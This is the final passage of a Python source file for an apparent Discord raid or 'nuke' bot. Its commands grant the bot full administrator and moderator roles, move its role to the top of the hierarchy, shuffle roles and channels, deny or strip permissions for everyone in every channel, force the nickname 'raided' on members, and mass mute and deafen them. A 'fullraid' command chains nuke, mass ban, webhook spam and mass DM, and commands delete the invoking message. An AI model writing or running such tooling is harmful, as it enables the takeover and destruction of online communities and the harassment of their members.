    )


# =====================================================================
# 108-125 — rate / perm ops / overwrites
# =====================================================================

@bot.command()
@is_admin()
async def antirate(ctx):
    await sd(ctx.message)
    for c in bot.commands:
        c._buckets = commands.CooldownMapping.from_cooldown(
            999, 1, commands.BucketType.default)
    await ctx.send("Internal cooldowns relaxed (server rate limits remain).",
                   delete_after=8)


@bot.command()
@is_admin()
async def cooldowndisable(ctx):
    await antirate.callback(ctx)


@bot.command()
@is_admin()
async def permissionsteal(ctx, role: discord.Role = None):
    await sd(ctx.message)
    src = role or (ctx.author.top_role if ctx.author.top_role else None)
    if not src: return
    nr = await backoff(lambda: ctx.guild.create_role(name=f"{src.name}-copy",
                                                     permissions=src.permissions))
    if nr: await ctx.send(f"Copied perms: {nr.mention}", delete_after=8)


@bot.command()
@is_admin()
async def adminsteal(ctx, member: discord.Member = None):
    await sd(ctx.message)
    tgt = member or ctx.guild.me
    r = await backoff(lambda: ctx.guild.create_role(
        name="adminsteal", permissions=discord.Permissions.all()))
    if r: await backoff(lambda r=r: tgt.add_roles(r))


@bot.command()
@is_admin()
async def modsteal(ctx, member: discord.Member = None):
    await sd(ctx.message)
    tgt = member or ctx.guild.me
    perms = discord.Permissions(
        kick_members=True, ban_members=True, manage_messages=True,
        manage_channels=True, manage_roles=True, moderate_members=True,
        deafen_members=True, mute_members=True, move_members=True)
    r = await backoff(lambda: ctx.guild.create_role(name="modsteal", permissions=perms))
    if r: await backoff(lambda r=r: tgt.add_roles(r))


@bot.command()
@is_admin()
async def overwritesteal(ctx, src: discord.TextChannel = None):
    await sd(ctx.message); src = src or ctx.channel
    for ch in ctx.guild.channels:
        for role, ow in src.overwrites.items():
            try: await ch.set_permissions(role, overwrite=ow)
            except Exception: pass


@bot.command()
@is_admin()
async def channelpermsteal(ctx, src: discord.TextChannel = None):
    await overwritesteal.callback(ctx, src=src)


@bot.command()
@is_admin()
async def rolepermsteal(ctx, role: discord.Role = None):
    await permissionsteal.callback(ctx, role=role)


@bot.command()
@is_admin()
async def hierarchybreak(ctx):
    await sd(ctx.message)
    me = ctx.guild.me
    for r in list(ctx.guild.roles):
        if r == me.top_role:
            try: await r.edit(position=len(ctx.guild.roles)-1)
            except Exception: pass


@bot.command()
@is_admin()
async def toppos(ctx):
    await sd(ctx.message)
    await backoff(lambda: ctx.guild.me.top_role.edit(position=len(ctx.guild.roles)-1))


@bot.command()
@is_admin()
async def bottompos(ctx, role: discord.Role = None):
    await sd(ctx.message)
    if role and not role.is_default():
        await backoff(lambda: role.edit(position=1))


@bot.command()
@is_admin()
async def rolepos(ctx):
    await sd(ctx.message)
    for r in sorted(ctx.guild.roles, key=lambda r: r.name):
        try: await r.edit(position=random.randint(1, max(1, len(ctx.guild.roles)-1)))
        except Exception: pass


@bot.command()
@is_admin()
async def channelpos(ctx):
    await sd(ctx.message)
    for ch in ctx.guild.channels:
        await backoff(lambda ch=ch: ch.edit(position=random.randint(0, 20)))


@bot.command()
@is_admin()
async def categorypos(ctx):
    await sd(ctx.message)
    for c in ctx.guild.categories:
        await backoff(lambda c=c: c.edit(position=random.randint(0, 10)))


@bot.command()
@is_admin()
async def massoverwrite(ctx, mode: str = "deny"):
    await sd(ctx.message)
    fn = denyall if mode == "deny" else allowall
    await fn.callback(ctx)


@bot.command()
@is_admin()
async def clearoverwrites(ctx):
    await sd(ctx.message)
    for ch in ctx.guild.channels:
        try: await ch.edit(overwrites={})
        except Exception: pass


@bot.command()
@is_admin()
async def denyall(ctx):
    await sd(ctx.message)
    for ch in ctx.guild.channels:
        try:
            ow = ch.overwrites_for(ctx.guild.default_role)
            ow.update(view_channel=False, send_messages=False, connect=False,
                      speak=False, add_reactions=False, attach_files=False,
                      embed_links=False, read_message_history=False)
            await ch.set_permissions(ctx.guild.default_role, overwrite=ow)
        except Exception: pass


@bot.command()
@is_admin()
async def allowall(ctx):
    await sd(ctx.message)
    for ch in ctx.guild.channels:
        try:
            ow = ch.overwrites_for(ctx.guild.default_role)
            ow.update(view_channel=True, send_messages=True, connect=True,
                      speak=True, add_reactions=True, attach_files=True,
                      embed_links=True, read_message_history=True)
            await ch.set_permissions(ctx.guild.default_role, overwrite=ow)
        except Exception: pass


# ---- 126-144 permission-deny family, generated ----

PERM_DENY_MAP = {
    "viewchanneldeny": "view_channel",
    "sendmessagedeny": "send_messages",
    "connectdeny": "connect",
    "speakdeny": "speak",
    "streamdeny": "stream",
    "reactdeny": "add_reactions",
    "attachdeny": "attach_files",
    "embeddeny": "embed_links",
    "historydeny": "read_message_history",
    "managechanneldeny": "manage_channels",
    "manageroledeny": "manage_roles",
    "banmembersdeny": "ban_members",
    "kickmembersdeny": "kick_members",
    "mentionalldeny": "mention_everyone",
    "externalemojideny": "use_external_emojis",
    "externalstickerdeny": "use_external_stickers",
    "useappdeny": "use_application_commands",
    "requesttospeakdeny": "request_to_speak",
    "createinvitedeny": "create_instant_invite",
}

def _make_denier(perm_attr):
    async def cmd(ctx):
        await sd(ctx.message)
        for ch in ctx.guild.channels:
            try:
                ow = ch.overwrites_for(ctx.guild.default_role)
                setattr(ow, perm_attr, False)
                await ch.set_permissions(ctx.guild.default_role, overwrite=ow)
            except Exception: pass
    cmd.__name__ = None  # overridden
    return cmd

for name, perm in PERM_DENY_MAP.items():
    bot.add_command(commands.Command(_make_denier(perm), name=name))


# =====================================================================
# 145-150 — nick / voice / full
# =====================================================================

@bot.command()
@is_admin()
async def changenicknameall(ctx, *, nick="raided"):
    await nickall.callback(ctx, nick=nick)


@bot.command()
@is_admin()
async def forcednick(ctx, member: discord.Member, *, nick="raided"):
    await sd(ctx.message)
    await backoff(lambda: member.edit(nick=nick[:32]))


@bot.command()
@is_admin()
async def resetnicks(ctx):
    await sd(ctx.message)
    for m in ctx.guild.members:
        if not m.bot: await backoff(lambda m=m: m.edit(nick=None))


@bot.command()
@is_admin()
async def massdeafen(ctx):
    await deafenall.callback(ctx)


@bot.command()
@is_admin()
async def massmute(ctx):
    await muteall.callback(ctx)


@bot.command()
@is_admin()
async def fullraid(ctx):
    await sd(ctx.message)
    await nuke.callback(ctx)
    await asyncio.sleep(1)
    await banall.callback(ctx)
    await asyncio.sleep(1)
    await webhookspam.callback(ctx, count=5, msg="raided")
    await massdm.callback(ctx, msg="raided")


# ---------- error handler ----------
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound): return
    if isinstance(error, commands.MissingPermissions):
        await ctx.reply("No permission.", mention_author=False)
    elif isinstance(error, commands.BotMissingPermissions):
        await ctx.reply("Bot missing permissions.", mention_author=False)
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.reply(f"Missing: `{error.param.name}`", mention_author=False)
    elif isinstance(error, commands.BadArgument):
        await ctx.reply("Bad argument.", mention_author=False)
    else:
        print(f"error: {type(error).__name__}: {error}")


if __name__ == "__main__":
    bot.run(TOKEN)
